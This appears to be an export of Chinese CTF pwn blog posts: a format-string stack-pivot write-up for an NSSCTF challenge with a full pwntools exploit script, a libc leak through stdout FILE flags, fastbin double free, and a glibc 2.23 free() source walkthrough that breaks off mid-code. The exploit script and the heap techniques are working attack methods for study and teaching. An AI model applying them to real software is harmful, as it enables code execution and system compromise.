[{"title":"NSSCTF EZFMT -- 格式化字符串栈溢出","url":"/2024/08/31/ezfmt/","content":"NSSCTF EZFMT – 格式化字符串栈溢出这道题感觉是格式化字符串使用比较全面的例子，留个档记录下。\n保护查看与静态分析Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x3ff000)\n\n\n\n程序为amd64架构，开启了NX与partial RELRO。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int i; // [rsp+Ch] [rbp-4h]  init_io(argc, argv, envp);  puts(&quot;Welcome to 3rd&quot;);  puts(&quot;fmt challenge&quot;);  for ( i = 0; i &lt;= 6; ++i )  &#123;    puts(&quot;&gt;&quot;);    read(0, buf, 0x100uLL);    printf(buf);  &#125;  return 0;&#125;\n\n\n\nIDA静态分析如上，发现main函数中存在格式化字符串漏洞，允许向bss段中写入0x100个字节，总计可以执行7次。\n漏洞利用printf会从栈中取参数，但我们的输入却在bss上，因此我们不能直接向栈中写入地址，因此我们考虑栈迁移到bss段。如果我们想要栈迁移，不可避免的是修改rbp，如果我们可以往栈内输入，可以直接泄露栈地址向栈中输入rbp的地址，再利用%n实现修改rbp。但我们不能向栈内写时，该如何修改栈中的数据呢。\n我们首先开始调试，将断点下在printf前，查看栈内状态。\npwndbg&gt; stack 0x3000:0000│ rsp 0x7fffffffdf68 —▸ 0x401247 (main+106) ◂— add dword ptr [rbp - 4], 101:0008│-010 0x7fffffffdf70 —▸ 0x7fffffffe070 ◂— 102:0010│-008 0x7fffffffdf78 ◂— 003:0018│ rbp 0x7fffffffdf80 ◂— 004:0020│+008 0x7fffffffdf88 —▸ 0x7ffff7df9083 (__libc_start_main+243) ◂— mov edi, eax05:0028│+010 0x7fffffffdf90 ◂— 0x50 /* &#x27;P&#x27; */06:0030│+018 0x7fffffffdf98 —▸ 0x7fffffffe078 —▸ 0x7fffffffe3a7 ◂— &#x27;/home/dov3/quz/NSS/ezfmt/pwn&#x27;07:0038│+020 0x7fffffffdfa0 ◂— 0x1f7fbd7a008:0040│+028 0x7fffffffdfa8 —▸ 0x4011dd (main) ◂— endbr64 09:0048│+030 0x7fffffffdfb0 —▸ 0x401260 (__libc_csu_init) ◂— endbr64 0a:0050│+038 0x7fffffffdfb8 ◂— 0x24f5fc9ff668308d0b:0058│+040 0x7fffffffdfc0 —▸ 0x4010b0 (_start) ◂— endbr64 0c:0060│+048 0x7fffffffdfc8 —▸ 0x7fffffffe070 ◂— 10d:0068│+050 0x7fffffffdfd0 ◂— 00e:0070│+058 0x7fffffffdfd8 ◂— 00f:0078│+060 0x7fffffffdfe0 ◂— 0xdb0a03604948308d10:0080│+068 0x7fffffffdfe8 ◂— 0xdb0a1320d606308d11:0088│+070 0x7fffffffdff0 ◂— 0... ↓        2 skipped14:00a0│+088 0x7fffffffe008 ◂— 115:00a8│+090 0x7fffffffe010 —▸ 0x7fffffffe078 —▸ 0x7fffffffe3a7 ◂— &#x27;/home/dov3/quz/NSS/ezfmt/pwn&#x27;16:00b0│+098 0x7fffffffe018 —▸ 0x7fffffffe088 —▸ 0x7fffffffe3c4 ◂— &#x27;SHELL=/bin/bash&#x27;17:00b8│+0a0 0x7fffffffe020 —▸ 0x7ffff7ffe190 ◂— 018:00c0│+0a8 0x7fffffffe028 ◂— 019:00c8│+0b0 0x7fffffffe030 ◂— 01a:00d0│+0b8 0x7fffffffe038 —▸ 0x4010b0 (_start) ◂— endbr64 1b:00d8│+0c0 0x7fffffffe040 —▸ 0x7fffffffe070 ◂— 11c:00e0│+0c8 0x7fffffffe048 ◂— 01d:00e8│+0d0 0x7fffffffe050 ◂— 01e:00f0│+0d8 0x7fffffffe058 —▸ 0x4010de (_start+46) ◂— hlt 1f:00f8│+0e0 0x7fffffffe060 —▸ 0x7fffffffe068 ◂— 0x1c20:0100│+0e8 0x7fffffffe068 ◂— 0x1c21:0108│ r13 0x7fffffffe070 ◂— 122:0110│+0f8 0x7fffffffe078 —▸ 0x7fffffffe3a7 ◂— &#x27;/home/dov3/quz/NSS/ezfmt/pwn&#x27;23:0118│+100 0x7fffffffe080 ◂— 024:0120│+108 0x7fffffffe088 —▸ 0x7fffffffe3c4 ◂— &#x27;SHELL=/bin/bash&#x27;\n\n\n\n我们可以看到，rbp + 0x18的位置 存了rbp + 0xf8的地址，而这个地址内又存了另一个栈中的地址。利用这一结构，我们就能实现对栈内的数据进行写。\n首先我们通过%n修改rbp + 0x18处的地址为我们想要修改的位置的地址，由于按页加载机制，我们只需要覆写低地址几位即可。这时rbp + 0xf8处就存了我们想要修改的地址。之后再次通过%n修改这一地址即可实现任意地址写，这道题我们则需要修改rbp与返回地址。\n这样我们可以得到一组payload，每次利用需要用掉两次输入机会。\npayload1 = (&quot;%&#123;&#125;c%11$hn&quot;.format(target)).encode()payload2 = (&quot;%&#123;&#125;c%39$hn&quot;.format(content)).encode()#其中hn仅作示例，可自由替换为n与hhn\n\n考虑到我们修改一个地址可能需要利用多次，7次的限制可能会很紧俏。但好消息是我们发现已经循环次数也存在栈中，因此我们同样可以修改这一数值。我们只需要在次数不够用时把这个值缩小即可继续进行利用。\n我们需要栈迁移的话，需要两次leave;ret，因此我们还需要修改返回地址。修改方法和上面相同。\n整体的利用流程如下\n1，泄露栈地址以及libc地址2，修改rbp与返回地址3，写入ROP执行栈迁移得到shell\n\n完整EXPfrom pwn import *from LibcSearcher import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r       = lambda num                :io.recv(num)rl      = lambda                    :io.recvline()ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b&#x27;\\x00&#x27;))uu64    = lambda data               :u64(data.ljust(8,b&#x27;\\x00&#x27;))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success(&#x27;\\033[1;31;40m%s --&gt; 0x%x \\033[0m&#x27; % (s, eval(s)))context.arch      = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;binary = &#x27;./pwn&#x27;libelf = &#x27;&#x27;if (binary!=&#x27;&#x27;): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=&#x27;&#x27;): libc = ELF(libelf)io = process(&quot;./pwn&quot;)#io = remote(&quot;node8.anna.nssctf.cn&quot;,23875)#通过格式化字符串泄露libc与栈地址payload1 = b&quot;%39$lx.%3$lx.%11$lx&quot; #read + 18  | rbp + 0x118ru(b&quot;&gt;\\n&quot;)sl(payload1)aim = int(ru(b&quot;.&quot;),16)ls(hex(aim))libc_read = int(ru(b&quot;.&quot;),16)-18rbp = int(ru(b&quot;\\n&quot;,),16) - 0x118 +0x20ls(hex(libc_read))ls(hex(rbp))libc = LibcSearcher(&quot;read&quot;,libc_read)libc_base = libc_read - libc.dump(&quot;read&quot;)one_gadget = libc_base + 0xe3afebin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)rdi_ret = 0x4012c3r12_13_14_15 = 0x4012bcls(hex(libc_base))#修改rbp为bss上地址a = rbp &amp; 0xffffls(hex(a))payload2 = (&quot;%&#123;&#125;c%11$hn&quot;.format(a)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload2)b = 0x4088payload3 = (&quot;%&#123;&#125;c%39$hn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)#gdb.attach(io)sl(payload3)c = a+2ls(hex(c))payload4 = (&quot;%&#123;&#125;c%11$hn&quot;.format(c)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload4)b = 0x40payload5 = (&quot;%&#123;&#125;c%39$hhn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#修改次数判断的部分，增加利用次数d = a-4ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)payload5 = (&quot;%39$hhn&quot;).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#修改返回地址为leave;ret,这里修改了末4字节d = a+8ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)b = 0x1256payload5 = (&quot;%&#123;&#125;c%39$hn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)d = a+10ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)b = 0x40payload5 = (&quot;%&#123;&#125;c%39$hn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#修改次数判断的部分，增加利用次数d = a-4ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)b = 0x3payload5 = (&quot;%&#123;&#125;c%39$hhn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#继续修改返回地址，这里修改首4字节d = a+12ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)payload5 = (&quot;%39$n&quot;).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#写入ROP栈迁移到bss执行onegadgetpayload6 = p64(rbp)+p64(rbp)+p64(rdi_ret)+p64(bin_sh)+p64(r12_13_14_15)+ p64(0)*4 +p64(one_gadget)ru(b&quot;&gt;\\n&quot;)#gdb.attach(io)sl(payload6)itr()\n\n后记一开始尝试使用system拿到shell，但尝试后发现system会向rsp-0x300左右的一个位置写，这里没有权限导致无法执行。最后换成了one_gadget才得以执行\n","categories":["pwn WriteUp"],"tags":["格式化字符串"]},{"title":"利用_IO_2_1_stdout泄露libc","url":"/2024/09/01/stdout_libc/","content":"_IO_2_1_stdout泄露libc利用方法利用方法比较简单，首先要想办法可以修改stdout处的内存，部分结构体如下:\nstruct _IO_FILE&#123;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */  /* The following pointers correspond to the C++ streambuf protocol. */  char *_IO_read_ptr;\t/* Current read pointer */  char *_IO_read_end;\t/* End of get area. */  char *_IO_read_base;\t/* Start of putback+get area. */  char *_IO_write_base;\t/* Start of put area. */  char *_IO_write_ptr;\t/* Current put pointer. */\n\n我们整体的修改内容如下，修改_flag为0xFBAD1800，将之后24个字节置零即_IO_read_ptr,_IO_read_end,_IO_read_base这三个8字节的地址置为0。\n之后的_IO_write_base与_IO_write_ptr分别为我们想要泄露的地址的起止点。之后我们不需要去管参数问题，只要有puts函数执行即可打印出我们想要泄露的信息。\n利用原理我们来看为什么这样做可以达到泄露libc的目的，先来看put函数的调用链，puts函数在源码中的形式为_IO_puts，\nputs -&gt; _IO_sputn -&gt; _IO_new_file_xsputnint_IO_fputs (const char *str, FILE *fp)&#123;  size_t len = strlen (str);  int result = EOF;  CHECK_FILE (fp, EOF);  _IO_acquire_lock (fp);  if ((_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)      &amp;&amp; _IO_sputn (fp, str, len) == len)    result = 1;  _IO_release_lock (fp);  return result;&#125;\n\n我们可以发现其中调用了_IO_sputn函数，它是一个宏，它调用了_IO_2_1_stdout中虚表所指向的_xsputn，即_IO_new_file_xsputn函数。\n_IO_new_file_xsputn -&gt; _IO_new_file_overflow在_IO_new_file_xsputn函数中大概做了如下的内容，由_IO_write_end - _IO_write_base去计算缓冲区还有多少空间。\n经过上述最后一步的判断，如果还有剩余则说明输出缓冲区未建立或者空间已满，那么就需要通过_IO_OVERFLOW函数来建立或清空缓冲区，这个函数主要是实现刷新缓冲区或建立缓冲区的功能。在vtable中为_IO_new_file_overflow。\nint_IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n\n上述源码很长，我们重点摘出其中几行进行分析\nif (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n\n其中前两个为我们需要绕过的条件判断，第三个是我们需要利用的函数。\n第一个判断若为真会直接返回，故第一个条件判断我们应控制其为假。\n第二个判断用于检查输出缓冲区是否为空，如果为空则进行分配空间，并且会初始化指针。会导致我们写入的_IO_write_base不可控。因此我们也需要让这个判断为假。\n这里我们会频繁的看到_flags这一参数。接下来浅做一个介绍。\n_flag是一个4字节的变量他的前两个字节由libc固定，通常为0xfbad0000，不同libc可能存在差异。而末两字节则用于根据规则决定程序的执行状态。后续执行流程中正如刚才给出的两个条件判断，他会与定义的一些常量进行按位与运算，判断接下来如何执行。\n我们先暂时不介绍每个数值的意义，继续看之前提到的绕过。\nif (f-&gt;_flags &amp; _IO_NO_WRITES)\n\n_IO_NO_WRITES这一不可写常量为8，我们需要这一部分为假，0xfbad0000即可满足条件。\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)\n\n_IO_NO_WRITES这一不可写常量定义为0x800，这里是或判断，我们需要让两部分均为假，f-&gt;_IO_write_base中填入的是泄露数据的起始地址，很显然不为空。后半自然假。前一半我们则需要让(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)!=0,由此我们填入的_flag应为0xfbad0800。\n_IO_do_write -&gt; _IO_new_do_write -&gt; new_do_write至此我们成功进入了_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);函数，而这一函数会进入_IO_new_do_write这一函数。\nint_IO_new_do_write (FILE *fp, const char *data, size_t to_do)&#123;  return (to_do == 0\t  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;libc_hidden_ver (_IO_new_do_write, _IO_do_write)\n\n\n\n这个函数没做太多操作，而是调用了 new_do_write函数，这一函数与我们 _IO_new_do_write 函数参数完全一致。\nnew_do_write new_do_write函数中包含有我们接下来需要做的其他绕过，\nstatic size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123;  size_t count;  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)    /* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */    fp-&gt;_offset = _IO_pos_BAD;  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;      off64_t new_pos\t= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);      if (new_pos == _IO_pos_BAD)\treturn 0;      fp-&gt;_offset = new_pos;    &#125;  count = _IO_SYSWRITE (fp, data, to_do);  if (fp-&gt;_cur_column &amp;&amp; count)    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0\t\t       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\t\t       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);  return count;&#125;\n\n这里我们就可以看到我们的最终目标\ncount = _IO_SYSWRITE (fp, data, to_do);\n\n而上面则是一组条件判断\nif (fp-&gt;_flags &amp; _IO_IS_APPENDING)    /* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */    fp-&gt;_offset = _IO_pos_BAD;  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;      off64_t new_pos\t= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);      if (new_pos == _IO_pos_BAD)\treturn 0;      fp-&gt;_offset = new_pos;    &#125;\n\n第一个判断为真则会对fp-&gt;_offset赋值，这一操作对我们的后续利用没有任何影响。而第二个判断中带有执行_IO_SYSSEEK，即lseek函数，\noff_t lseek(int filedes, off_t offset, int whence) ;\n\n这一函数用于控制在文件操作时的文件偏移量。而这里我们的偏移量为fp-&gt;_IO_write_base - fp-&gt;_IO_read_end 如果我们的fp-&gt;_IO_read_end很小，必然会导致执行出错。\n那可能有同学要问，我们为什么不绕过这两个判断，让fp-&gt;_IO_read_end == fp-&gt;_IO_write_base，这一操作原理上是可行的，但我们通常选择覆写fp-&gt;_IO_write_base的低8bit为0。接下来会给出一段stdout中的内存。\npwndbg&gt; x/30gx stdout0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;:\t\t0x00000000fbad2887\t0x00007ffff7e1b8030x7ffff7e1b790 &lt;_IO_2_1_stdout_+16&gt;:\t0x00007ffff7e1b803\t0x00007ffff7e1b8030x7ffff7e1b7a0 &lt;_IO_2_1_stdout_+32&gt;:\t0x00007ffff7e1b803\t0x00007ffff7e1b8030x7ffff7e1b7b0 &lt;_IO_2_1_stdout_+48&gt;:\t0x00007ffff7e1b803\t0x00007ffff7e1b8030x7ffff7e1b7c0 &lt;_IO_2_1_stdout_+64&gt;:\t0x00007ffff7e1b804\t0x00000000000000000x7ffff7e1b7d0 &lt;_IO_2_1_stdout_+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7e1b7e0 &lt;_IO_2_1_stdout_+96&gt;:\t0x0000000000000000\t0x00007ffff7e1aaa00x7ffff7e1b7f0 &lt;_IO_2_1_stdout_+112&gt;:\t0x0000000000000001\t0xffffffffffffffff0x7ffff7e1b800 &lt;_IO_2_1_stdout_+128&gt;:\t0x000000000a000000\t0x00007ffff7e1ca700x7ffff7e1b810 &lt;_IO_2_1_stdout_+144&gt;:\t0xffffffffffffffff\t0x00000000000000000x7ffff7e1b820 &lt;_IO_2_1_stdout_+160&gt;:\t0x00007ffff7e1a9a0\t0x00000000000000000x7ffff7e1b830 &lt;_IO_2_1_stdout_+176&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7e1b840 &lt;_IO_2_1_stdout_+192&gt;:\t0x00000000ffffffff\t0x00000000000000000x7ffff7e1b850 &lt;_IO_2_1_stdout_+208&gt;:\t0x0000000000000000\t0x00007ffff7e176000x7ffff7e1b860:\t0x00007ffff7e1b6a0\t0x00007ffff7e1b780\n\n如果我们将_IO_write_base的低8bit写为0，这样由于输出的起始地址变小了，所以会打印很多内容。从中即可找出我们要的libc地址。\n如果题目开启了随机化保护(PIE),我们可能就无法写入一个有效的地址，更不可能让fp-&gt;_IO_read_end == fp-&gt;_IO_write_base。\n综上所述，更好的选择往往是直接进入第一个条件判断，由此避免执行else if的部分。即fp-&gt;_flags &amp; _IO_IS_APPENDING应为真。\n_IO_IS_APPENDING这一常量为0x1000,这时我们的_flag变为了0xfbad1800。\n由此我们就能到达_IO_SYSWRITE系统调用，泄露出libc地址。\n总结前面写的内容比较多，但整体在讲的都是调用链和如何绕过。实际操作时则比较简单。我们可以直接修改_flag为0xFBAD1800，将之后24个字节置零即_IO_read_ptr,_IO_read_end,_IO_read_base这三个8字节的地址置为0。再多输入2个字节的0x0就能完成利用，通常甚至无需考虑 _IO_write_ptr。\n","categories":["pwn 利用方法"],"tags":["信息泄露"]},{"title":"FASTBIN 利用方法（更新中~咕）","url":"/2024/09/03/FASTBIN%E4%B9%8Bdouble%20free/","content":"FASTBIN 利用方法（更新中~咕）fastbin采用一个单向链表来维护释放的堆块。我们先来看一下释放堆块源码中逻辑上的关键部分\nunsigned int idx = fastbin_index(size);fb = &amp;fastbin (av, idx);    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */\n\n为了不在这里介绍一些很长的判断，我选择将源码中的注释放了过来。fastbin (av, idx)是一个宏的调用，实现如下：\n#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])\n\n不难发现它根据传入的分配区，和idx变量(根据释放堆块的大小判断出应放入fastbinsY的下标)返回了这一堆块该放入的fastbinsY的地址，之后进行如下操作P-&gt;FD = *FB; *FB = P;。\n用叙述性的语言表达出来的话就是，fastbinsY[idx]中存着最后链入其中的堆块的地址。在最初时这个值为0。当有新的堆块链入时，他会把这一地址写入新来的堆块的fd中。同时将fastbinsY[idx]更新为新的堆块的地址。\n打一个可能没那么形象的比方，向FASTBIN中插入堆块就像是排队，队尾的人会举着一个标记队尾的牌子，当有新的人来排队时，新来的人会跟在队尾后面，接过前队尾传来的牌子。(之所以说不太形象大概是因为fastbin是后进先出，显然排队讲究先进先出)。\ndouble free简单理解fastbin的结构之后我们来看double free。double free的利用场景通常是程序在释放内存时没有检查堆块是否已经被释放。因此我们可以将一个已经放入fastbin的堆块再次free。\n但在free中对这种行为并不是没有任何检查。如下为2.23版本的free函数\n/* Check that the top of the bin is not the record we are going to add\t   (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  &#123;\t    errstr = &quot;double free or corruption (fasttop)&quot;;\t    goto errout;\t  &#125;if (__glibc_unlikely (p == av-&gt;top))      &#123;\terrstr = &quot;double free or corruption (top)&quot;;\tgoto errout;      &#125;    /* Or whether the next chunk is beyond the boundaries of the arena.  */    if (__builtin_expect (contiguous (av)\t\t\t  &amp;&amp; (char *) nextchunk\t\t\t  &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))      &#123;\terrstr = &quot;double free or corruption (out)&quot;;\tgoto errout;      &#125;    /* Or whether the block is actually not marked used.  */    if (__glibc_unlikely (!prev_inuse(nextchunk)))      &#123;\terrstr = &quot;double free or corruption (!prev)&quot;;\tgoto errout;      &#125;\n\n这里检查了四件事：\n1，free的堆块是不是fastbin的头堆块(即最后一个放入fastbin的堆块)\n2，free的堆块是不是arena中的top chunk。\n3，free的堆块的nextchunk(这里的nextchunk指物理相邻的chunk)是否超过了topchunk的边界。\n​\t这里使用了nextchunk这一变量来源如下:\nnextchunk = chunk_at_offset(p, size);\n\n顾名思义是根据堆块大小偏移获取nextchunk的地址，如果nextchunk的地址超过了topchunk则报错。\n4，最后检查nextchunk中是否将prev_inuse置1。\n由于上述条件的存在，我们可以得出一些堆利用中应该注意的点。\n1，我们不能连续释放同一个堆块2，修改chunk大小时应该注意不应该让这个大小超出topchunk范围3，释放的堆块的nextchunk必须将prev_inuse置1\n\n所以我们在进行double free的利用时通常如下:\nfree(chunk1);free(chunk2);free(chunk1);\n\n收益经过double free之后我们的收益是什么？经过double free我们的chunk1被放入了fastbin中2次，我们先申请出来一个，我们就能获得操作一个还在fastbin中的chunk的机会。\n例如我们修改它的FD指向我们想要修改的地址，如hook等，当我们第二次申请chunk1时，它便会将fd中的内容写入fastbin的头(fb = p-&gt;fd)。我们再次申请堆块时，新申请的堆块地址就是我们写入的地址。\n","categories":["堆利用"],"tags":["heap"]},{"title":"free源码分析 -- libc2.23","url":"/2024/09/03/FREE%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","content":"free源码分析 -- libc2.23经过一系列查找，我们最终在malloc/malloc.c中找到了free的实现，这里的函数名为__libc_free。\nvoid__libc_free (void *mem)&#123;  mstate ar_ptr;  mchunkptr p;                          /* chunk corresponding to mem */  void (*hook) (void *, const void *)    = atomic_forced_read (__free_hook);  if (__builtin_expect (hook != NULL, 0))    &#123;      (*hook)(mem, RETURN_ADDRESS (0));      return;    &#125;  if (mem == 0)                              /* free(0) has no effect */    return;  p = mem2chunk (mem);  if (chunk_is_mmapped (p))                       /* release mmapped memory. */    &#123;      /* see if the dynamic brk/mmap threshold needs adjusting */      if (!mp_.no_dyn_threshold          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)        &#123;          mp_.mmap_threshold = chunksize (p);          mp_.trim_threshold = 2 * mp_.mmap_threshold;          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                      mp_.mmap_threshold, mp_.trim_threshold);        &#125;      munmap_chunk (p);      return;    &#125;  ar_ptr = arena_for_chunk (p);  _int_free (ar_ptr, p, 0);&#125;\n\n 以上便是__libc_free的全貌，起码是相当外层的一个样子，显然一会会出现一个很长的调用链。\nfree hookvoid (*hook) (void *, const void *)    = atomic_forced_read (__free_hook);  if (__builtin_expect (hook != NULL, 0))    &#123;      (*hook)(mem, RETURN_ADDRESS (0));      return;    &#125;\n\n这部分为free_hook相关内容，为了便于理解，先解释几个宏和函数以及hook的逻辑。\n atomic_forced_read (__free_hook)//这是一个宏，它的作用是强制要求读取__free_hook中的内容，而避免由于编译器优化导致一些操作被优化掉。\n\n\n\n__builtin_expect (hook != NULL, 0)//这个函数的作用与一般的条件判断相同，唯一的区别是第二个参数代表了这个条件判断更期望出现的情况，用于“指导“编译器编译时做出最优选择。//说句人话就是编译器会将更期望出现的情况紧跟在后，而对其他情况使用 jmp 等指令，用于减少 jmp 的执行次数，提高效率。\n\n\n\n这里的逻辑现在就会简单的变成了将free_hook读出来，若不为空则执行free_hook中的内容。\n这里我们注意到free_hook执行完成后会直接返回，这是因为glibc提供free_hook给用户，让用户更好的去控制内存释放的内容，将所有的工作全部交给了用户，包括释放内存。也就是说如果用户没有在free_hook中实现释放内存，那内存就不会被释放。\nfree(0) 与 获取真正地址  if (mem == 0)                              /* free(0) has no effect */    return;  p = mem2chunk (mem);\n\n这里完成了对free (0)的判断，与获取真正chunk的地址。众所周知我们能在申请内存时返回的地址不会是chunk头。但free是需要chunk头的地址。所以mem2chunk (mem)只是返回chunk头地址。\nmmapif (chunk_is_mmapped (p))                       /* release mmapped memory. */    &#123;      /* see if the dynamic brk/mmap threshold needs adjusting */      if (!mp_.no_dyn_threshold          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)        &#123;          mp_.mmap_threshold = chunksize (p);          mp_.trim_threshold = 2 * mp_.mmap_threshold;          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                      mp_.mmap_threshold, mp_.trim_threshold);        &#125;      munmap_chunk (p);      return;    &#125;\n\n之后是针对通过mmap分配的块的处理。我们暂且跳过这部分。\n_int_freear_ptr = arena_for_chunk (p);  _int_free (ar_ptr, p, 0);\n\n之后便是获得分配区地址。即arena_for_chunk。\n这个定义是一个宏。\n#define heap_for_ptr(ptr) \\  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))#define arena_for_chunk(ptr) \\  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)\n\n之后便是_int_free，也就是free的主要实现部分\nstatic void_int_free (mstate av, mchunkptr p, int have_lock)&#123;  INTERNAL_SIZE_T size;        /* its size */  mfastbinptr *fb;             /* associated fastbin */  mchunkptr nextchunk;         /* next contiguous chunk */  INTERNAL_SIZE_T nextsize;    /* its size */  int nextinuse;               /* true if nextchunk is used */  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */  mchunkptr bck;               /* misc temp for linking */  mchunkptr fwd;               /* misc temp for linking */  const char *errstr = NULL;  int locked = 0;  size = chunksize (p);  /* Little security check which won&#x27;t hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by &quot;design&quot; from some intruder.  */  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    &#123;      errstr = 